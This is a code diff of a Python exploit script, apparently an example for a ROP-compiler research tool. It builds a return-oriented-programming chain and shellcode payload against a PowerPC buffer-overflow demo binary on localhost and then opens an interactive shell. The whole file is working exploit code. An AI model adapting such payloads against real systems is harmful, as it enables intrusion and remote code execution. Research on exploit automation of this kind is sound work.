@@ -5,7 +5,6 @@ from rop_compiler import ropme
 
 filename = './example/ppc_bof'
 p = remote('localhost', 2222)
-
 buffer_address = struct.unpack(">I", p.read(4))[0]
 
 shellcode = ( # http://shell-storm.org/shellcode/files/shellcode-86.php
@@ -27,16 +26,13 @@ shellcode = ( # http://shell-storm.org/shellcode/files/shellcode-86.php
 target_address = buffer_address + 700
 print "shellcode ({} bytes) address: 0x{:x}".format(len(shellcode), target_address)
 
-if len(sys.argv) > 1:
-  print "Using automatically built ROP chain"
-  rop = ropme.rop_to_shellcode([(filename, None, 0)], [], target_address, archinfo.ArchPPC32(), logging.DEBUG)
-else:
-  print "Using manaul ROP chain"
-  rop = struct.pack(">I", target_address)
+rop = ropme.rop_to_shellcode([(filename, None, 0)], [], target_address, archinfo.ArchPPC32('Iend_BE'), logging.DEBUG)
 
-#payload = 'A'*512 + 'B'*0x1c + rop # gcc
-payload = 'A'*512 + 'B'*0x14 + rop # clang
-payload += ((700 - len(payload)) * 'C') + shellcode
+payload = 'A'*512 + 'B'*0x1c
+# We need some custom gadgets to fixup the stack because of the PPC function saving the lr above the current stack frame
+payload += struct.pack(">i", 0x10000670) + "C" * 12 + struct.pack(">i", 0x1000066c) + "D"*4 # how annoying
+payload += rop
+payload += ((700 - len(payload)) * 'E') + shellcode
 payload += "JEFF" # To end our input
 
 with open("/tmp/rop", "w") as f: f.write(rop)
@@ -44,3 +40,4 @@ with open("/tmp/payload", "w") as f: f.write(payload)
 
 p.writeline(payload)
 p.interactive()
+
